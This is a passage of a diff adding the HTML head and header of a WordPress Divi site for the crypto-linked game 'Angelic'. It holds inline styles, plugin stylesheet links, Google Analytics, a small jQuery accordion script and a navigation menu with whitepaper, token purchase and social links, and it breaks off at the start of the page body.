100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+</style>
+<link rel='stylesheet' id='wc-gallery-style-css'  href='wp-content/plugins/boldgrid-gallery/includes/css/style9748.css?ver=1.55' type='text/css' media='all' />
+<link rel='stylesheet' id='wc-gallery-popup-style-css'  href='wp-content/plugins/boldgrid-gallery/includes/css/magnific-popupf488.css?ver=1.1.0' type='text/css' media='all' />
+<link rel='stylesheet' id='wc-gallery-flexslider-style-css'  href='wp-content/plugins/boldgrid-gallery/includes/vendors/flexslider/flexsliderc141.css?ver=2.6.1' type='text/css' media='all' />
+<link rel='stylesheet' id='wc-gallery-owlcarousel-style-css'  href='wp-content/plugins/boldgrid-gallery/includes/vendors/owlcarousel/assets/owl.carousel6b25.css?ver=2.1.4' type='text/css' media='all' />
+<link rel='stylesheet' id='wc-gallery-owlcarousel-theme-style-css'  href='wp-content/plugins/boldgrid-gallery/includes/vendors/owlcarousel/assets/owl.theme.default6b25.css?ver=2.1.4' type='text/css' media='all' />
+<link rel='stylesheet' id='et-builder-googlefonts-cached-css'  href='https://fonts.googleapis.com/css?family=Nunito:200,200italic,300,300italic,regular,italic,600,600italic,700,700italic,800,800italic,900,900italic&amp;subset=latin,latin-ext&amp;display=swap' type='text/css' media='all' />
+<link rel='stylesheet' id='popup-maker-site-css'  href='wp-content/uploads/pum/pum-site-stylesc5bb.css?generated=1645722240&amp;ver=1.16.4' type='text/css' media='all' />
+<link rel='stylesheet' id='animatecss-css'  href='wp-content/plugins/post-and-page-builder/assets/css/animate.minf51d.css?ver=1.16.0' type='text/css' media='all' />
+<link rel='stylesheet' id='boldgrid-components-css'  href='wp-content/plugins/post-and-page-builder/assets/css/components.min3819.css?ver=2.16.2' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-css'  href='wp-content/plugins/post-and-page-builder/assets/css/font-awesome.min4906.css?ver=4.7' type='text/css' media='all' />
+<link rel='stylesheet' id='boldgrid-fe-css'  href='wp-content/plugins/post-and-page-builder/assets/css/editor-fe.minf51d.css?ver=1.16.0' type='text/css' media='all' />
+<link rel='stylesheet' id='boldgrid-custom-styles-css'  href='wp-content/plugins/post-and-page-builder/assets/css/custom-styles7404.css?ver=5.9.3' type='text/css' media='all' />
+<link rel='stylesheet' id='bgpbpp-public-css'  href='wp-content/plugins/post-and-page-builder-premium/dist/application.min97de.css?ver=1.0.5' type='text/css' media='all' />
+<link rel='stylesheet' id='divi-style-parent-css'  href='wp-content/themes/Divi/style-static.min3940.css?ver=4.13.1' type='text/css' media='all' />
+<link rel='stylesheet' id='divi-style-pum-css'  href='wp-content/themes/Divi-child/stylee665.css?ver=4.13.1.1637430604' type='text/css' media='all' />
+<script type='text/javascript' src='wp-includes/js/jquery/jquery.minaf6c.js?ver=3.6.0' id='jquery-core-js'></script>
+<script type='text/javascript' src='wp-includes/js/jquery/jquery-migrate.mind617.js?ver=3.3.2' id='jquery-migrate-js'></script>
+<link rel="https://api.w.org/" href="wp-json/index.html" /><link rel="alternate" type="application/json" href="wp-json/wp/v2/pages/22.json" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.9.3" />
+<link rel='shortlink' href='index.html' />
+<link rel="alternate" type="application/json+oembed" href="wp-json/oembed/1.0/embedd362.json?url=https%3A%2F%2Fangelicthegame.com%2F" />
+<link rel="alternate" type="text/xml+oembed" href="wp-json/oembed/1.0/embed96b3?url=https%3A%2F%2Fangelicthegame.com%2F&amp;format=xml" />
+<style>
+
+/* CSS added by Hide Metadata Plugin */
+
+.entry-meta .byline,
+			.entry-meta .by-author,
+			.entry-header .entry-meta > span.byline,
+			.entry-meta .author.vcard {
+				display: none;
+			}
+.entry-meta .posted-on,
+			.entry-header .entry-meta > span.posted-on {
+				display: none;
+			}</style>
+		<script>
+			document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );
+		</script>
+				<style>
+			.no-js img.lazyload { display: none; }
+			figure.wp-block-image img.lazyloading { min-width: 150px; }
+							.lazyload, .lazyloading { opacity: 0; }
+				.lazyloaded {
+					opacity: 1;
+					transition: opacity 400ms;
+					transition-delay: 0ms;
+				}
+					</style>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" /><style type="text/css" id="custom-background-css">
+body.custom-background { background-color: #110f24; }
+</style>
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1Q6CGGDQZ8"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-1Q6CGGDQZ8');
+</script>
+<script>
+jQuery(function($){
+  $('.et_pb_toggle_title').click(function(){
+    var $toggle = $(this).closest('.et_pb_toggle');
+    if (!$toggle.hasClass('et_pb_accordion_toggling')) {
+      var $accordion = $toggle.closest('.et_pb_accordion');
+      if ($toggle.hasClass('et_pb_toggle_open')) {
+        $accordion.addClass('et_pb_accordion_toggling');
+        $toggle.find('.et_pb_toggle_content').slideToggle(700, function() { 
+          $toggle.removeClass('et_pb_toggle_open').addClass('et_pb_toggle_close'); 
+					
+        });
+      }
+      setTimeout(function(){ 
+        $accordion.removeClass('et_pb_accordion_toggling'); 
+      }, 750);
+    }
+  });
+});
+</script><link rel="icon" href="wp-content/uploads/2021/11/cropped-Angelic-Logo-Cropped-Favicon-1-32x32.png" sizes="32x32" />
+<link rel="icon" href="wp-content/uploads/2021/11/cropped-Angelic-Logo-Cropped-Favicon-1-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="wp-content/uploads/2021/11/cropped-Angelic-Logo-Cropped-Favicon-1-180x180.png" />
+<meta name="msapplication-TileImage" content="https://angelicthegame.com/wp-content/uploads/2021/11/cropped-Angelic-Logo-Cropped-Favicon-1-270x270.png" />
+<style id="et-divi-customizer-global-cached-inline-styles">#et_search_icon:hover,.mobile_menu_bar:before,.mobile_menu_bar:after,.et_toggle_slide_menu:after,.et-social-icon a:hover,.et_pb_sum,.et_pb_pricing li a,.et_pb_pricing_table_button,.et_overlay:before,.entry-summary p.price ins,.et_pb_member_social_links a:hover,.et_pb_widget li a:hover,.et_pb_filterable_portfolio .et_pb_portfolio_filters li a.active,.et_pb_filterable_portfolio .et_pb_portofolio_pagination ul li a.active,.et_pb_gallery .et_pb_gallery_pagination ul li a.active,.wp-pagenavi span.current,.wp-pagenavi a:hover,.nav-single a,.tagged_as a,.posted_in a{color:#024895}.et_pb_contact_submit,.et_password_protected_form .et_submit_button,.et_pb_bg_layout_light .et_pb_newsletter_button,.comment-reply-link,.form-submit .et_pb_button,.et_pb_bg_layout_light .et_pb_promo_button,.et_pb_bg_layout_light .et_pb_more_button,.et_pb_contact p input[type="checkbox"]:checked+label i:before,.et_pb_bg_layout_light.et_pb_module.et_pb_button{color:#024895}.footer-widget h4{color:#024895}.et-search-form,.nav li ul,.et_mobile_menu,.footer-widget li:before,.et_pb_pricing li:before,blockquote{border-color:#024895}.et_pb_counter_amount,.et_pb_featured_table .et_pb_pricing_heading,.et_quote_content,.et_link_content,.et_audio_content,.et_pb_post_slider.et_pb_bg_layout_dark,.et_slide_in_menu_container,.et_pb_contact p input[type="radio"]:checked+label i:before{background-color:#024895}a{color:#024895}#main-header,#main-header .nav li ul,.et-search-form,#main-header .et_mobile_menu{background-color:#110f24}.nav li ul{border-color:rgba(46,163,242,0)}#top-header,#et-secondary-nav li ul{background-color:#024895}.et_header_style_centered .mobile_nav .select_page,.et_header_style_split .mobile_nav .select_page,.et_nav_text_color_light #top-menu>li>a,.et_nav_text_color_dark #top-menu>li>a,#top-menu a,.et_mobile_menu li a,.et_nav_text_color_light .et_mobile_menu li a,.et_nav_text_color_dark .et_mobile_menu li a,#et_search_icon:before,.et_search_form_container input,span.et_close_search_field:after,#et-top-navigation .et-cart-info{color:#68689a}.et_search_form_container input::-moz-placeholder{color:#68689a}.et_search_form_container input::-webkit-input-placeholder{color:#68689a}.et_search_form_container input:-ms-input-placeholder{color:#68689a}#top-menu li a{font-size:16px}body.et_vertical_nav .container.et_search_form_container .et-search-form input{font-size:16px!important}#top-menu li.current-menu-ancestor>a,#top-menu li.current-menu-item>a,#top-menu li.current_page_item>a{color:#ffffff}#main-footer{background-color:#150a33}#footer-widgets .footer-widget a,#footer-widgets .footer-widget li a,#footer-widgets .footer-widget li a:hover{color:#7474aa}.footer-widget{color:#7474aa}#main-footer .footer-widget h4,#main-footer .widget_block h1,#main-footer .widget_block h2,#main-footer .widget_block h3,#main-footer .widget_block h4,#main-footer .widget_block h5,#main-footer .widget_block h6{color:#7474aa}.footer-widget li:before{border-color:rgba(46,163,242,0)}.footer-widget .et_pb_widget div,.footer-widget .et_pb_widget ul,.footer-widget .et_pb_widget ol,.footer-widget .et_pb_widget label{line-height:1.7em}#et-footer-nav .bottom-nav li.current-menu-item a{color:#024895}#footer-bottom{background-color:#150a33}body .et_pb_bg_layout_light.et_pb_button:hover,body .et_pb_bg_layout_light .et_pb_button:hover,body .et_pb_button:hover{border-radius:0px}@media only screen and (min-width:981px){#logo{max-height:30%}.et_pb_svg_logo #logo{height:30%}.et_header_style_centered.et_hide_primary_logo #main-header:not(.et-fixed-header) .logo_container,.et_header_style_centered.et_hide_fixed_logo #main-header.et-fixed-header .logo_container{height:11.88px}.et_header_style_left .et-fixed-header #et-top-navigation,.et_header_style_split .et-fixed-header #et-top-navigation{padding:33px 0 0 0}.et_header_style_left .et-fixed-header #et-top-navigation nav>ul>li>a,.et_header_style_split .et-fixed-header #et-top-navigation nav>ul>li>a{padding-bottom:33px}.et_header_style_centered header#main-header.et-fixed-header .logo_container{height:66px}.et_header_style_split #main-header.et-fixed-header .centered-inline-logo-wrap{width:66px;margin:-66px 0}.et_header_style_split .et-fixed-header .centered-inline-logo-wrap #logo{max-height:66px}.et_pb_svg_logo.et_header_style_split .et-fixed-header .centered-inline-logo-wrap #logo{height:66px}.et_header_style_slide .et-fixed-header #et-top-navigation,.et_header_style_fullscreen .et-fixed-header #et-top-navigation{padding:24px 0 24px 0!important}.et-fixed-header #top-menu a,.et-fixed-header #et_search_icon:before,.et-fixed-header #et_top_search .et-search-form input,.et-fixed-header .et_search_form_container input,.et-fixed-header .et_close_search_field:after,.et-fixed-header #et-top-navigation .et-cart-info{color:#68689a!important}.et-fixed-header .et_search_form_container input::-moz-placeholder{color:#68689a!important}.et-fixed-header .et_search_form_container input::-webkit-input-placeholder{color:#68689a!important}.et-fixed-header .et_search_form_container input:-ms-input-placeholder{color:#68689a!important}.et-fixed-header #top-menu li.current-menu-ancestor>a,.et-fixed-header #top-menu li.current-menu-item>a,.et-fixed-header #top-menu li.current_page_item>a{color:#ffffff!important}}@media only screen and (min-width:1350px){.et_pb_row{padding:27px 0}.et_pb_section{padding:54px 0}.single.et_pb_pagebuilder_layout.et_full_width_page .et_post_meta_wrapper{padding-top:81px}.et_pb_fullwidth_section{padding:0}}	h1,h2,h3,h4,h5,h6{font-family:'Nunito',Helvetica,Arial,Lucida,sans-serif}body,input,textarea,select{font-family:'Nunito',Helvetica,Arial,Lucida,sans-serif}.et_pb_toggle_open .et_pb_toggle_title:before{display:block!important;content:"\e04f"}@media (max-width:984px){.timeline-desktop{display:none!important}}@media (min-width:985px){.timeline-tablet-mobile{display:none!important}}.pum-theme-2225 .pum-content+.pum-close,.pum-theme-default-theme .pum-content+.pum-close{background-color:#621117!important}.pum-container.pum-responsive.pum-responsive-medium{margin-left:-30%;width:60%;background-color:#110F24}.pum-container .pum-content>:first-child{margin-top:0;padding-top:5px!important;padding-bottom:5px!important;background-color:#110F24!important}html.pum-open.pum-open-overlay.pum-open-scrollable .pum-overlay.pum-active{overflow-y:scroll;background:transparent!important}.container.et_menu_container{z-index:99;max-width:100%!important}#et_top_search{float:right;margin:3px 0 0 22px;position:relative;display:none;width:18px}.row{display:flex;flex-wrap:wrap;margin-right:-0.75rem
+rem;margin-left:-0.75rem}.contact-section .social{margin-top:5rem}.justify-content-center{justify-content:center!important}.d-flex{display:flex!important}.contact-section .social a{text-align:center;height:3rem;width:3rem;background:rgba(255,255,255,0.1);border-radius:100%;line-height:3rem;color:rgba(255,255,255,0.3)}.ml-2,.mx-2{margin-left:0.5rem!important}.mr-2,.mx-2{margin-right:0.5rem!important}svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa.fa-w-10{width:0.625em}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-0.125em}.dp-tilt-column-parallex{-webkit-transform:translate(3px,3px);-ms-transform:translate(3px,3px);transform:translate(3px,3px)}.dp-tilt-column-parallex .et_pb_blurb_content{transform:translateZ(30px)}.coming-soon{font-size:8px!important;color:#f3f3f3!important}#left-area .post-meta{font-size:14px;padding-bottom:15px;display:none}#comment-wrap{padding-top:75px;display:none}#main-content .container:before{background:none}#sidebar{display:none}</style></head>
+<body class="home page-template-default page page-id-22 custom-background et-tb-has-template et-tb-has-footer boldgrid-ppb et_pb_button_helper_class et_fixed_nav et_show_nav et_primary_nav_dropdown_animation_fade et_secondary_nav_dropdown_animation_fade et_header_style_left et_cover_background et_pb_gutter linux et_pb_gutters3 et_pb_pagebuilder_layout et_no_sidebar et_divi_theme et-db">
+	<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0.49803921568627" /><feFuncG type="table" tableValues="0 0.49803921568627" /><feFuncB type="table" tableValues="0 0.49803921568627" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 1" /><feFuncG type="table" tableValues="0 0.27843137254902" /><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0 0" /><feFuncG type="table" tableValues="0 0.64705882352941" /><feFuncB type="table" tableValues="0 1" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.78039215686275 1" /><feFuncG type="table" tableValues="0 0.94901960784314" /><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.44705882352941 0.4" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.098039215686275 1" /><feFuncG type="table" tableValues="0 0.66274509803922" /><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><div id="page-container">
+<div id="et-boc" class="et-boc">
+			
+		
+
+	<header id="main-header" data-height-onload="66">
+<div class="container clearfix et_menu_container">
+				  <div class="logo_container"><img src="Angelic-Logo-Cropped-Small.png" width="300" height="21" alt=""/> <span class="logo_helper"></span>
+			</div>
+					<div id="et-top-navigation" data-height="66" data-fixed-height="66">
+									<nav id="top-menu-nav">
+					<ul id="top-menu" class="nav"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2274"><a target="_blank" rel="noopener" href="whitepaper/angelic.pdf">Whitepaper</a></li>
+					  <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2274"><a target="_blank" rel="noopener" href="Swap.html">Buy $ANGL</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2295"><a href="team/index.html">Team</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2352"><a href="roadmap/index.html">Roadmap</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-76"><a href="#">Community</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-80"><a target="_blank" rel="noopener" href="https://www.facebook.com/angelicthegame">Facebook</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2006"><a target="_blank" rel="noopener" href="https://www.instagram.com/angelicthegame">Instagram</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-77"><a target="_blank" rel="noopener" href="https://twitter.com/angelicthegame">Twitter</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-78"><a target="_blank" rel="noopener" href="https://discord.gg/qvQnCyX">Discord</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-79"><a target="_blank" rel="noopener" href="https://www.youtube.com/channel/UCBWOS4GaF6QlfL58kyfOOzg/">Youtube</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2005"><a target="_blank" rel="noopener" href="https://store.steampowered.com/app/1440570/Angelic/">Steam</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2276"><a target="_blank" rel="noopener" href="https://t.me/AngelicOfficial">Telegram</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-81"><a target="_blank" rel="noopener" href="https://metaverse-game-studios.breezy.hr/">Careers</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-2351"><a href="#">More</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-70"><a href="#">Staking (soon)</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-73"><a href="#">Tools (soon)</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-72"><a href="#">Heroes (soon)</a></li>
+</ul>
+</li>
+</ul>					</nav>
+				
+				
+				
+									<div id="et_top_search">
+						<span id="et_search_icon"></span>
+					</div>
+				
+				<div id="et_mobile_nav_menu">
+				<div class="mobile_nav closed">
+					<span class="select_page">Select Page</span>
+					<span class="mobile_menu_bar mobile_menu_bar_toggle"></span>
+				</div>
+			</div>			</div> <!-- #et-top-navigation -->
+		</div> <!-- .container -->
+				<div class="et_search_outer">
+			<div class="container et_search_form_container">
+				<form role="search" method="get" class="et-search-form" action="https://angelicthegame.com/">
+				<input type="search" class="et-search-field" placeholder="Search &hellip;" value="" name="s" title="Search for:" />				</form>
+				<span class="et_close_search_field"></span>
+			</div>
+		</div>
+			</header> <!-- #main-header -->
+<div id="et-main-area">
+	
+<div id="main-content">
+
+
+			
+				<article id="post-22" class="post-22 page type-page status-publish has-post-thumbnail hentry">
+
+				
+					<div class="entry-content">
+					<div class="et-l et-l--post">
+			<div class="et_builder_inner_content et_pb_gutters3">
+		<div id="container" class="et_pb_section et_pb_section_1 wrapper_point et_pb_section_parallax et_pb_with_background et_section_regular" >
+				
+				<div class="et_parallax_bg_wrap"><div
+						class="et_parallax_bg"
+						style="background-image: url(wp-content/uploads/2021/11/BG-e1637776135638.png);"
+					></div></div>
+				
+				
+					<div class="et_pb_row et_pb_row_1">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_1  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
